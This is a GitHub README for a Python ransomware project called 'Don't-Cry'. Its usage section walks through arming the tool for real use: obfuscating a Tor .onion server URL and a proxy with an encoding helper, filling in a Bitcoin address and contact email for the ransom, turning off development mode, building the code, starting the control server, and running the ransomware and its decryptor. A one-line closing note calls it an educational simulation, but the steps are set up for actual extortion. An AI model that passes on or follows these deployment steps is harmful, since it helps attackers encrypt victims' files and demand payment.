# Don't-Cry Ransomware
![Python](https://img.shields.io/badge/Python-3.12%2B-blue?logo=python\&logoColor=white)
![Cython](https://img.shields.io/badge/Requires-Cython-yellow?logo=python\&logoColor=white)
![License](https://img.shields.io/github/license/memecoder12345678/DCry-Ransomware?style=flat\&logo=open-source-initiative\&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Windows-blue)
![Status](https://img.shields.io/badge/Status-Temporarily--Inactive-orange)
![DCry](./DCRY.png)
Ransomware using Python 💀💀💀
## Usage
* Open the [`DCry.py`](./src/DCry.py) file.
* Replace the `YOUR_URL` variable with the encoded URL using the `dx42` function like this:
  ```python
  YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
  ```
  (Use the `ex42` function from the `edx42` module to encode your URL first.)
  
  Example:
  ```python
  encoded_url = ex42(b"https://your-tor-server.onion")
  YOUR_URL = dx42(encoded_url).decode()
  ```
* Replace the `YOUR_PROXY` variable similarly with your encoded proxy string:
  ```python
  YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()
  ```
* Replace `YOUR_BITCOIN_ADDRESS` with your actual Bitcoin address string.
* Replace `YOUR_EMAIL_ADDRESS` with your actual email address string.
* Set `dev_mode = False` to disable development mode.
* Install the required packages with the following command:
  ```bash
  pip install -r requirements.txt
  ```
* Build the Cython code with the following command:
  ```bash
  python src/setup.py build_ext --inplace
  ```
* Run the server with the following command:
  ```bash
  python src/server.py
  ```
* Run the ransomware with the following command:
  ```bash
  python src/DCRY.py
  ```
* Run the decryptor with the following command:
  ```bash
  python src/decryptor.py
  ```
## Warning
> \[!WARNING]
> This project is a ransomware simulation for educational purposes only.
## License
* This project is licensed under the terms of the [Apache License 2.0](./LICENSE).
